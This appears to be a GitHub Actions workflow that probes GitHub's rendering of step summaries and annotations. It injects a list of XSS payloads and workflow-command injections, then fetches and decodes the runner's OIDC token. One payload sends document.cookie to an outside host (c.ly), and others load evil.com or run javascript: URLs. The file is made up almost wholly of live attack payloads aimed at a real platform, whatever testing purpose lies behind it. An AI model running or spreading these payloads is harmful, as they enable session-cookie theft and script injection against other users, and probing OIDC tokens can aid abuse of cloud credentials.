name: Inspector
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Step Summary XSS payloads
        run: |
          echo "# XSS Test" >> "$GITHUB_STEP_SUMMARY"
          echo "<script>document.title='XSS'</script>" >> "$GITHUB_STEP_SUMMARY"
          echo "<img src=x onerror=\"fetch('https://c.ly/xss?c='+document.cookie)\">" >> "$GITHUB_STEP_SUMMARY"
          echo "<svg onload=\"alert(1)\"><circle r='50'/></svg>" >> "$GITHUB_STEP_SUMMARY"
          echo "<iframe src='https://evil.com'></iframe>" >> "$GITHUB_STEP_SUMMARY"
          echo "<style>body{background:red!important}</style>" >> "$GITHUB_STEP_SUMMARY"
          echo "<details open ontoggle=\"alert('ontoggle')\"><summary>x</summary></details>" >> "$GITHUB_STEP_SUMMARY"
          echo "<a href=\"javascript:alert(1)\">JS link</a>" >> "$GITHUB_STEP_SUMMARY"
          echo "[Normal link](javascript:alert(2))" >> "$GITHUB_STEP_SUMMARY"
          echo "done writing summary"

      - name: Workflow annotations injection
        run: |
          echo "::notice title=<script>alert(1)</script>::notice body"
          echo "::error::<img src=x onerror=alert(2)>"
          printf "::set-env name=INJECTED::<script>alert(3)</script>\n"

      - name: OIDC claims inspection
        run: |
          T=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
          echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
import sys,json
d=json.load(sys.stdin)
print('ref:',d.get('ref'))
print('head_ref:',d.get('head_ref'))
print('base_ref:',d.get('base_ref'))
print('event_name:',d.get('event_name'))
print('sub:',d.get('sub'))
print('ref_protected:',d.get('ref_protected'))
"
